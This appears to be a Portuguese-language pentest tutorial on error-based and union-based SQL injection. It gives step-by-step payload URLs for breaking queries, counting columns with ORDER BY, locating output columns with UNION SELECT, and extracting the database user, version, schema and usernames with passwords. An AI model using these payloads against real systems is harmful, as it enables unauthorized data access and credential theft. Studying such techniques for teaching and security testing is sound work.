SQLi Error based se refere ao casos onde vamos utilizar as mensagens de erro para extrair informações sensíveis do banco de dados. 

### Step 1 Quebrar a consulta

Vamos utilizar aspas para tentar causar um erro na consulta esperada, depois vamos analisar se alguma resposta diferente foi retornada. 
```
http://exemplo.com/?search=1'
http://exemplo.com/?search=-1' #para descobrir qual banco de dados
```
Depois vamos tentar entender qual tipo de consulta está sendo feita ao banco de dados.
Exemplo a aplicação retorna o erro “syntax to use near ‘asd%’ or description LIKE ‘%’ asd%” por ela retornar o erro com ‘LIKE’ e ‘%’ podemos deduzir que a consulta é por um item que tenha uma palavra especifica em qualquer lugar do dado:
```
select tabela from user where user='Carlos'
```


### Step 2 Procurando número de colunas

Para enumerar colunas podemos usar o ```order by``` vamos aumentar o numero de colunas até que um erro seja retornado.
```
http://exemplo.com/?id=1' order by 1-- -
http://exemplo.com/?id=1' order by 9-- - 

```
Erros nessa consulta podem acontecer como um WAF dropando nossa requisição ou a syntax não está correta

### Step 3 Buscar por output

Agora depois de saber o numero de colunas precisamos descobrir quais delas estão sendo retornadas na aplicação para continuar com a exploração. Para encontrar quais colunas são retornadas vamos usar o `union select`.
```
http://exemplo.com/?search=1 union select 1,2,3,4,5,6,7,8,9
```
A consulta vai retornar o número das colunas que trazem o output

### Step 4 Iniciar enumeração

Depois de descobrir onde o output da consulta vai ser retornado vamos iniciar a extração de dados do banco de dados.
```
# Get username of the sql-user
http://example.com/photoalbum.php?id=1 union select 1,2,3,4,user(),6,7,8,9

# Get version
http://example.com/photoalbum.php?id=1 union select 1,2,3,4,version(),6,7,8,9

# Get all tables

http://example.com/photoalbum.php?id=1 union select 1,2,3,4,table_name,6,7,8,9 from information_schema.tables

# Get all columns from a specific table

http://example.com/photoalbum.php?id=1 union select 1,2,3,4,column_name,6,7,8,9 from information_schema.columns where table_name = 'users'

# Get content from the users-table. From columns name and password. The 0x3a only servers to create a delimitor between name and password

http://example.com/photoalbum.php?id=1 union select 1,2,3,4,concat(name,0x3a,
password),6,7,8,9 FROM users
```
